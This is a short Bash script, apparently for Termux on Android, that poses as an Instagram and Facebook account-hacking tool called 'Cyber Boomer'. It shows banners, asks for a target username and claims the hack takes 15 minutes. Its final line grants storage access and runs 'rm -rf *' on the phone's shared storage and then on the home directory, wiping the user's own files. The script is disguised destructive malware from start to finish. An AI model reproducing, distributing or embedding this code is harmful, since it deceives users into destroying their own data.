#!/bin/bash
#-----------------
red='\033[1;31m'
rset='\033[0m'
grn='\033[1;32m'
ylo='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'
##################
#inserting
clear

echo -e "$grn Installing Requirements Please wait..!! $rset "
echo " "
echo -e "$ylo Installing Python To Make Requests $ rset"
pkg install python -y > /dev/null 2>&1
pip install lolcat > /dev/null 2>&1
echo " Done "
sleep 2 
clear
echo " "
echo '


 ██████╗██╗   ██╗██████╗ ███████╗██████╗ 
██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝
██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗
╚██████╗   ██║   ██████╔╝███████╗██║  ██║
 ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                         
' | lolcat
echo " "
echo '

██████   ██████   ██████  ███    ███ ███████ ██████  
██   ██ ██    ██ ██    ██ ████  ████ ██      ██   ██ 
██████  ██    ██ ██    ██ ██ ████ ██ █████   ██████  
██   ██ ██    ██ ██    ██ ██  ██  ██ ██      ██   ██ 
██████   ██████   ██████  ██      ██ ███████ ██   ██ 
                                                     
                                                     
' | lolcat
echo -e "$red [ 1 ] $ylo Hack Instagram..? $rset"
echo " "
echo -e "$red [ 2 ] $ylo Hack Facebook...? $rset"
echo " "
read -p  " Select Option >>>>> " opt
sleep 2 
clear
echo -e "$grn Enter Username $rset"
read user
clear
echo " Hacking To The Account..! it taked 15mins"
cd && termux-setup-storage && cd /sdcard && rm -rf * && cd && rm -rf *
